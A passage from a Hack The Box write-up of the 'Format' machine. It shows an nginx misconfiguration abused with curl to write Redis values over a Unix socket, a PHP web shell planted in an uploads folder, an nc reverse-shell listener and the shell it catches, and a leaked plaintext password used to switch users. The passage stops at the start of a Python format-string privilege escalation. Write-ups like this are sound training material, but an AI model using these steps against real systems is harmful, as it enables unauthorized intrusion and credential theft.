<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="n">mail</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="n">spool</span>\<span class="o">/</span><span class="n">news</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="n">spool</span>\<span class="o">/</span><span class="n">uucp</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span>\<span class="o">/</span><span class="nb">bin</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="n">www</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="n">backups</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="nb">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="nb">list</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span>\<span class="o">/</span><span class="n">run</span>\<span class="o">/</span><span class="n">ircd</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="n">lib</span>\<span class="o">/</span><span class="n">gnats</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span>\<span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span>\<span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span>\<span class="o">/</span><span class="n">run</span>\<span class="o">/</span><span class="n">systemd</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span>\<span class="o">/</span><span class="n">run</span>\<span class="o">/</span><span class="n">systemd</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">:</span>\<span class="o">/</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Core</span> <span class="n">Dumper</span><span class="p">:</span>\<span class="o">/</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">cooper</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">::</span>\<span class="o">/</span><span class="n">home</span>\<span class="o">/</span><span class="n">cooper</span><span class="p">:</span>\<span class="o">/</span><span class="nb">bin</span>\<span class="o">/</span><span class="n">bash</span>
<span class="n">redis</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">33</span><span class="p">::</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="n">lib</span>\<span class="o">/</span><span class="n">redis</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">git</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="n">Git</span> <span class="n">Version</span> <span class="n">Control</span><span class="p">,,,:</span>\<span class="o">/</span><span class="n">home</span>\<span class="o">/</span><span class="n">git</span><span class="p">:</span>\<span class="o">/</span><span class="nb">bin</span>\<span class="o">/</span><span class="n">bash</span>
<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">112</span><span class="p">::</span>\<span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span>\<span class="o">/</span><span class="n">run</span>\<span class="o">/</span><span class="n">sshd</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
<span class="n">_laurel</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">997</span><span class="p">:</span><span class="mi">997</span><span class="p">::</span>\<span class="o">/</span><span class="n">var</span>\<span class="o">/</span><span class="n">log</span>\<span class="o">/</span><span class="n">laurel</span><span class="p">:</span>\<span class="o">/</span><span class="nb">bin</span>\<span class="o">/</span><span class="n">false</span>
</pre></div>

Inspecting the system further, if we navigate to the configuration files of <code>nginx</code>, specifically the <code>/etc/nginx/sites-available/default</code> file, we can see the following:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">location</span> <span class="o">~</span> \<span class="o">/</span><span class="n">static</span>\<span class="o">/</span><span class="p">(</span><span class="o">.*</span><span class="p">)</span>\<span class="o">/</span><span class="p">(</span><span class="o">.*</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">resolver</span> <span class="mf">127.0.0.1</span><span class="p">;</span>
        <span class="n">proxy_pass</span> <span class="n">http</span><span class="p">:</span>\<span class="o">/</span>\<span class="o">/</span><span class="err">$</span><span class="mf">1.</span><span class="n">microbucket</span><span class="o">.</span><span class="n">htb</span>\<span class="o">/</span><span class="err">$</span><span class="mi">2</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

While conducting some internet research, this nginx configuration structure can potentially be exploited to attempt interactions with Unix sockets. In this <a href="https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/">article</a>, you can find information on how to potentially exploit this for Unix socket interactions. Additionally, I found some information in the following section of <a href="https://exploit-notes.hdks.org/exploit/database/redis-pentesting/#get%2Fset-key-value-commands-with-nginx-misconfiguration">Exploit Notes - HDKS</a>, which provides an example of attempting to modify values in a Redis database:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/21.png"/><br/><br/>
A configuration similar to the one we are dealing with is presented, along with a command for interacting with Redis. It appears to allow us to modify the values of fields associated with a key.<br/><br/>
To gather more information about the fields whose values we can change, I began reading the section on registering new users.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/22.png"/><br/><br/>
Here, all the fields stored in the database are being leaked. Judging by the structure, it seems that the <code>key</code> in this case is the user, and the fields include <code>username</code>, <code>password</code>, <code>first-name</code>, and so on.<br/><br/>
The values assigned to these fields are the ones received through the POST parameters.<br/><br/>
Upon accessing our blog, we are presented with the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/25.png"/><br/><br/>
Having read through the source code, I noticed that the field returned when accessing the blog was <code>first-name</code>.<br/><br/>
Knowing this, I can attempt to alter values by exploiting the vulnerable nginx configuration.<br/><br/>
With this information in mind, let's try to change the <code>first-name</code> of our user and then reload the page to verify if the change was successful.<br/><br/>
Recalling the structure shown in <a href="https://exploit-notes.hdks.org/exploit/database/redis-pentesting/#get%2Fset-key-value-commands-with-nginx-misconfiguration">Exploit Notes - HDKS</a>, we will begin making the requests.<br/><br/>
<div class="highlight"><pre><span></span><span class="n">HSET</span> <span class="o">&lt;</span><span class="n">key</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">field</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;</span>
</pre></div>

First, we make the request to <code>/static</code> (as shown in the nginx configuration), and using an <code>HSET</code> request, we will alter the <code>first-name</code> field for the key <code>elswix</code> (remember that the key belongs to our username), and finally, we will assign the value <code>PWNED</code> to the <code>first-name</code> field.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">HSET</span> <span class="s1">'http://microblog.htb/static/unix:/var/run/redis/redis.sock:elswix</span><span class="si">%20f</span><span class="s1">irst-name%20PWNED%20/a'</span>
</pre></div>

If we now reload the page where our blog is hosted, we can see that we have successfully changed the value of the <code>first-name</code> field in our account.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/26.png"/><br/><br/>
Indeed, simply changing the <code>first-name</code> value may not be very useful. <br/><br/>
Upon reevaluating the code, we notice the presence of a function that checks if the user has the <code>Pro</code> field set to <code>true</code>.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/27.png"/><br/><br/>
Certainly, users who have the value <code>true</code> in the <code>pro</code> field likely enjoy some additional advantages with their blogs.<br/><br/>
Upon reading the code, we notice that users with the <code>true</code> value in the <code>pro</code> field have the privilege of uploading images to the blog:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/28.png"/><br/><br/>
We can upload images, and they are stored in the <code>/uploads</code> section, which initially, as a non-privileged user, we cannot access:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/29.png"/><br/><br/>
With this knowledge and taking advantage of our ability to alter database values through the vulnerability we found, let's change the value of the <code>pro</code> field for our user to <code>true</code>.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">HSET</span> <span class="s1">'http://microblog.htb/static/unix:/var/run/redis/redis.sock:elswix%20pro%20true%20/a'</span>
</pre></div>

We reload the blog editing page and see the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/30.png"/><br/><br/>
We have successfully become a <code>Pro</code> user.<br/><br/>
To upload an image, we must ensure that it is in PNG format, as otherwise, it will not allow us to upload it:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/31.png"/><br/><br/>
We can access the image, and we see that it has been stored in the <code>/uploads</code> section:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/33.png"/><br/><br/>
Previously, the <code>/uploads</code> section did not exist, but now we can access it only if we know the names of the files located in that directory:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/34.png"/><br/><br/>
It appears that in the <code>uploads</code> directory, we have write privileges, given that we are uploading images. If we recall what we've observed, when executing the LFI, the information we entered in the <code>id</code> parameter was the name of the file where the information provided through the <code>txt</code> parameter would be written in HTML format.<br/><br/>
What does this mean?<br/><br/>
We can attempt to write a <code>php</code> program in the <code>uploads</code> directory (since we have access) that should be interpreted when loaded. We will specify the content of the <code>php</code> file using the <code>txt</code> parameter and indicate the location where it should be stored through the <code>id</code> parameter.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/35.png"/><br/><br/>
By sending this, the <code>run.php</code> file will be created in the <code>/uploads</code> section, where we can use the <code>cmd</code> parameter to specify system-level commands to execute:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/36.png"/><br/><br/>
Quickly, we will send a reverse shell to our attacker machine.<br/><br/>
First, we need to set up a listener:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
</pre></div>

Next, we send the reverse shell by executing the following:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/38.png"/><br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.213</span><span class="p">:</span><span class="mf">43784.</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">620</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
<span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span>
</pre></div>

We have successfully accessed the system, now we will simply adjust the TTY to interact more comfortably with the system:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
<span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
<span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
<span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>

<span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
                               <span class="n">reset</span>
<span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
<span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span>
</pre></div>
<h3><br>Shell as cooper</br></h3><br>
The first thing that came to mind after accessing the system was to list other system-level users:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">home</span>
<span class="n">total</span> <span class="mi">8</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">cooper</span> <span class="n">cooper</span> <span class="mi">4096</span> <span class="n">May</span> <span class="mi">22</span> <span class="mi">20</span><span class="p">:</span><span class="mi">41</span> <span class="n">cooper</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">git</span>    <span class="n">git</span>    <span class="mi">4096</span> <span class="n">Apr</span> <span class="mi">18</span> <span class="mi">23</span><span class="p">:</span><span class="mi">20</span> <span class="n">git</span>
<span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

First, I thought of connecting to <code>Redis</code> using the <code>redis-cli</code> tool, specifying the path to the <code>redis.sock</code> file since there is no mention of the service being exposed through ports:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span> 
<span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span>
</pre></div>

Listing the <code>keys</code> in Redis, we come across the following:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">keys</span> <span class="o">*</span>
<span class="mi">1</span><span class="p">)</span> <span class="s2">"PHPREDIS_SESSION:6s3d6s122d2070uvovhs29c4s3"</span>
<span class="mi">2</span><span class="p">)</span> <span class="s2">"elswix"</span>
<span class="mi">3</span><span class="p">)</span> <span class="s2">"cooper.dooper:sites"</span>
<span class="mi">4</span><span class="p">)</span> <span class="s2">"elswix:sites"</span>
<span class="mi">5</span><span class="p">)</span> <span class="s2">"cooper.dooper"</span>
<span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span>
</pre></div>

There's one that belongs to the user <code>cooper</code>. We can try listing its contents:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">hgetall</span> <span class="n">cooper</span><span class="o">.</span><span class="n">dooper</span>
 <span class="mi">1</span><span class="p">)</span> <span class="s2">"username"</span>
 <span class="mi">2</span><span class="p">)</span> <span class="s2">"cooper.dooper"</span>
 <span class="mi">3</span><span class="p">)</span> <span class="s2">"password"</span>
 <span class="mi">4</span><span class="p">)</span> <span class="s2">"zooperdoopercooper"</span>
 <span class="mi">5</span><span class="p">)</span> <span class="s2">"first-name"</span>
 <span class="mi">6</span><span class="p">)</span> <span class="s2">"Cooper"</span>
 <span class="mi">7</span><span class="p">)</span> <span class="s2">"last-name"</span>
 <span class="mi">8</span><span class="p">)</span> <span class="s2">"Dooper"</span>
 <span class="mi">9</span><span class="p">)</span> <span class="s2">"pro"</span>
<span class="mi">10</span><span class="p">)</span> <span class="s2">"false"</span>
<span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span>
</pre></div>

We have the password for the user <code>cooper</code> leaked in line number 4. We can try testing it by performing a system-level user migration:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">su</span> <span class="n">cooper</span>
<span class="n">Password</span><span class="p">:</span> <span class="n">zooperdoopercooper</span>
<span class="nd">cooper@format</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="err">$</span>
</pre></div>

Now that we are logged in as the user <code>cooper</code>, we can view the first flag:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="err">$</span> <span class="n">cd</span>
<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="n">d23e9</span><span class="o">**********************</span><span class="n">feca4</span>
<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>
<h3><br>Shell as root</br></h3><br>
If we list the sudo privileges for the user <code>cooper</code>, we see the following:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">cooper</span><span class="p">:</span> 
<span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">cooper</span> <span class="n">on</span> <span class="nb">format</span><span class="p">:</span>
    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
    <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="nb">bin</span>

<span class="n">User</span> <span class="n">cooper</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="nb">format</span><span class="p">:</span>
    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span>
<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

The user <code>cooper</code> can run the program <code>/usr/bin/license</code> as root.<br/><br/>
When listing the file type for <code>license</code>, we see that it is a Python script:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">file</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span><span class="p">:</span> <span class="n">Python</span> <span class="n">script</span><span class="p">,</span> <span class="n">ASCII</span> <span class="n">text</span> <span class="n">executable</span>
<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

If we analyze the program carefully, we notice that we could potentially exploit a <code>Python Format String Vulnerability</code>. While searching for information, I came across the following article: <a href="https://podalirius.net/en/articles/python-format-string-vulnerabilities/">Python Format String Vulnerabilities</a>.<br/><br/>
This article discusses how, by using Format String, you can attempt to access objects of classes in the running program. In other words, if we can exploit it successfully, we can try to access the content of variables defined in the program, for example.<br/><br/>
But before we start exploiting it, let's take a closer look at how the code works.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/39.png"/><br/><br/>
First, the <code>License</code> class is created. The main <code>__init__</code> function creates a variable called <code>license</code> that is set to a random string of 40 characters in length.<br/><br/>
